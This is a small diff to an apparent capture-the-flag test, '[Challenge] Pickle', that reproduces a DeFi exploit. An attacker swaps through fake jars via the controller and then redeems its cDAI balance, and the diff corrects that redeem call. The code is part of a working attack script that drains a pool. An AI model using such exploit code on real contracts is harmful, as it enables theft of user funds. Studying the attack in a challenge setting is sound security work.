@@ -84,7 +84,7 @@ describe('[Challenge] Pickle', function () {
     await controller.swapExactJarForJar(fakeJarC.address, fakeJarD.address, 0, 0, targets, datas);
 
     const balanceOfUnderlying = await cDAI.balanceOfUnderlying(attacker.address);
-    const u = await cDAI.redeemUnderlying();
+    await cDAI.redeemUnderlying(balanceOfUnderlying);
 
     // Attacker has taken all tokens from the pool
     console.log('After, Attacker cDAI Balance', await formatToken(await cDAI.balanceOf(attacker.address), cDAI));
